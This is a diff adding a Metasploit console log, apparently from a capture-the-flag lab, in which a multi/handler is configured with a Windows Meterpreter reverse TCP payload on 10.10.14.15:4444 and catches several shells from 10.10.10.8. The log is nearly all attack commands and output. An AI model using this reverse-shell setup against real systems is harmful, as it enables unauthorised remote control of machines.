@@ -130,3 +130,48 @@ Active sessions
 
 msf5 exploit(multi/handler) > 
 
+
+
+msf5 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*]  - Meterpreter session 1 closed.  Reason: Died
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 127.0.0.1) at 2021-01-17 11:55:51 +0800
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (10.10.14.15:4444 -> 127.0.0.1) at 2021-01-17 11:55:52 +0800
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*]  - Meterpreter session 2 closed.  Reason: Died
+[*]  - Meterpreter session 3 closed.  Reason: Died
+[*] Meterpreter session 3 opened (10.10.14.15:4444 -> 127.0.0.1) at 2021-01-17 11:55:52 +0800
